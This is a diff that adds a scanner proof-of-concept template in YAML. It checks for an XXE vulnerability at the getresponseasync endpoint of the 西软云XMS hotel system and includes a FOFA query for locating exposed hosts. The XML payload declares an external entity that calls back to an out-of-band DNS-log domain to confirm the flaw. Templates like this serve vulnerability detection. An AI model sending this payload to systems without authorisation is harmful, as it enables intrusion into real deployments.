@@ -1,0 +1,21 @@
+id: poc-yaml-xi-ruan-yun-getresponseasync-xxe
+info:
+  name: 西软云XMS getresponseasync XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 西软云XMS
+  fofa: app="shiji-西软云XMS"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /ItfServerRS/rest/ideas/getresponseasync
+  headers:
+    Content-Type: text/xml
+  data: <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{.domain}}"> %remote;]>
+  expression: status_code == 200 && contains(content_type,"application/soap+xml")
+    && reverse.Verify()
+transport: http
